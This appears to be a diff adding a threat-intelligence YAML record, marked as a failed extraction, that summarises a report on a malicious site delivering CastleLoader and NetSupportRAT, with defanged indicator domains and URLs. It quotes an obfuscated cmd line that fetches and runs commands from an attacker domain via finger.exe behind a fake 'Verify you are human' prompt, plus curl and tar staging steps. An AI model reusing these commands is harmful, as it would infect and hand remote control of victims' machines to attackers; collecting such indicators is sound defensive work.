@@ -1,0 +1,58 @@
+# Failed YAML extraction
+# Timestamp: 2026-05-01T19:49:27.766073
+# Response length: 1616 chars
+# Input chunk preview: '=== ARTICLE BODY ===Acknowledgments: Special thanks to Sarah Reddish for her contributions to this investigation and write-up.BackgroundFigure 1: Malicious siteYou probably already have a go-to tool f'
+# ============================================================
+
+title: "Malicious site delivers CastleLoader and NetSupportRAT"
+description: A malicious website delivers CastleLoader, which in turn drops NetSupportRAT.
+attribution: ""
+malware_families:
+  - CastleLoader
+  - NetSupportRAT
+cves: []
+ttps:
+  processes:
+    - cmd.exe
+    - finger.exe
+    - curl.exe
+    - tar.exe
+    - python.exe
+    - msiexec.exe
+  command_lines:
+    - "%COMSPEC% /k s^t^a^r^t "" /min for /f \"skip=8 delims=\" %h in ('f^^i^^n^^g^^e^^r nrLeDHDESi@cheeshomireciple[.]com') do call %h & exit && echo ' ---Verify you are human--------press ENTER--- '"
+    - "curl.exe -L https://www.python.org/ftp/python/3.9.1/python-3.9.1-embed-amd64.zip -o python-3.9.1-embed-amd64.pdf"
+    - "tar.exe xzf python-3.9.1-embed-amd64.pdf"
+    - "msiexec.exe /i <N><M>.exe"
+  powershell: []
+  scripts:
+    - "{[Text.Encoding]::UTF8.GetString(...)}"
+  registry_keys: []
+  image_loads:
+    - ntdll.dll
+    - kernel32.dll
+    - shlwapi.dll
+    - user32.dll
+    - wininet.dll
+    - shell32.dll
+    - comdlg32.dll
+  network_connections:
+    - cmd.exe -> cheeshomireciple[.]com:80
+    - curl.exe -> hxxps://trindastal[.]com/4ba0af68-0037-5f6e-afd1-64f89fc0f554/loc8:443
+    - python.exe -> hxxps://trindastal[.]com/4ba0af68-0037-5f6e-afd1-64f89fc0f554/v8:443
+  file_activity:
+    - *.ini
+    - <N><M>.exe
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+    - cheeshomireciple[.]com
+    - trindastal[.]com
+  urls:
+    - hxxps://trindastal[.]com/4ba0af68-0037-5f6e-afd1-64f89fc0f554/loc8
+    - hxxps://trindastal[.]com/4ba0af68-0037-5f6e-afd1-64f89fc0f554/v8
+authors:
+  - Sarah Reddish
